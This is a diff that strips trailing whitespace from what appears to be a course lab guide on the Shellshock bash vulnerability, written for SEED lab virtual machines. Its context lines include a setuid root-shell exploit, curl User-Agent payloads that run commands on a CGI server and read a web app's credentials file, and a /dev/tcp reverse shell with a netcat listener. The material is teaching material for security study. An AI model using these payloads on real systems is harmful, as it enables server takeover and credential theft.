@@ -57,7 +57,7 @@ sudo chown root vul
 sudo chmod 4755 vul
 ./vul
 export foo='() { echo "hello world"; }; echo /bin/sh'
-./vul # get the root shell! 
+./vul # get the root shell!
 sudo ln -sf /bin/dash /bin/sh # reset sh
 ```
 
@@ -65,8 +65,8 @@ sudo ln -sf /bin/dash /bin/sh # reset sh
 
 ### Pro Tip
 
-You will likely need code/CGI scripts from the course code repo. 
-You can easily fetch code from the website using `wget`. 
+You will likely need code/CGI scripts from the course code repo.
+You can easily fetch code from the website using `wget`.
 
 ```bash
 # Use wget to get a file from our course repo & save to the default folder for the Apache webserver
@@ -97,8 +97,8 @@ Put this script (`test.cgi`) in `/usr/bin/cgi-bin/`
 #!/bin/bash_shellshock
 
 echo "Content-type: text/plain"
-echo 
-echo 
+echo
+echo
 echo "Hello World"
 ```
 
@@ -116,7 +116,7 @@ curl http://10.0.2.69/cgi-bin/test.cgi
 #!/bin/bash_shellshock
 
 echo "Content-type: text/plain"
-echo 
+echo
 echo "*** Environment Variables ***"
 strings /proc/$$/environ
 ```
@@ -134,16 +134,16 @@ curl -A "test" -v http://10.0.2.69/cgi-bin/test.cgi
 ### Launching the attack
 
 ```bash
-curl -A "() { echo hello; }; 
-         echo Content-type: text/plain; 
+curl -A "() { echo hello; };
+         echo Content-type: text/plain;
          echo; /bin/ls -l"
          http://10.0.2.69/cgi-bin/test.cgi
 ```
 
 ```bash
-curl -A "() { echo hello; }; 
-         echo Content-type: text/plain; 
-         echo; 
+curl -A "() { echo hello; };
+         echo Content-type: text/plain;
+         echo;
          /bin/cat /var/www/CSRF/Elgg/elgg-config/settings.php"
          http://10.0.2.69/cgi-bin/test.cgi
 ```
@@ -160,10 +160,10 @@ ifconfig
 ```
 
 ```bash
-curl -A "() { echo hello; }; 
-         echo Content-type: text/plain; 
-         echo; 
-         echo; 
+curl -A "() { echo hello; };
+         echo Content-type: text/plain;
+         echo;
+         echo;
          /bin/bash -i > /dev/tcp/10.0.2.70/9090 0<&1 2>&1"
          http://10.0.2.69/cgi-bin/test.cgi
 ```
@@ -177,26 +177,26 @@ id
 
 Follow instructions in Appendices in the SEED setup manual (lab00) to see how to clone your existing SEED VM and properly configure the NAT Network.
 
-Step 1: 
+Step 1:
 ```bash
 # start netcat server on "attacker" machine
 seed@VM(10.0.2.15):~$ nc -lv 9090
 Listening on [0.0.0.0] (family 0, port 9090)
 ```
 
-Step 2: 
+Step 2:
 ```bash
 # experiment with ideal payload on "victim" machine (i.e., a remote server)
 seed@VM(10.0.2.7):~$ /bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1
 ```
 
-At this point, you have a reverse shell setup! 
-You can now specify commands from the "attacker" VM, 
-which are sent over the network connection and run on the victim's machine; 
-the results are also sent back over the network connection to the "attacker" VM. 
-In this way, you have shell access to the victim VM! 
+At this point, you have a reverse shell setup!
+You can now specify commands from the "attacker" VM,
+which are sent over the network connection and run on the victim's machine;
+the results are also sent back over the network connection to the "attacker" VM.
+In this way, you have shell access to the victim VM!
 
 The question then is: how do you get the victim to execute your payload?!
 
-**NOTE:** The IP addresses are specific to my configuration. 
-You should use `ifconfig` to verify the IP addresses on your VMs. 
+**NOTE:** The IP addresses are specific to my configuration.
+You should use `ifconfig` to verify the IP addresses on your VMs.
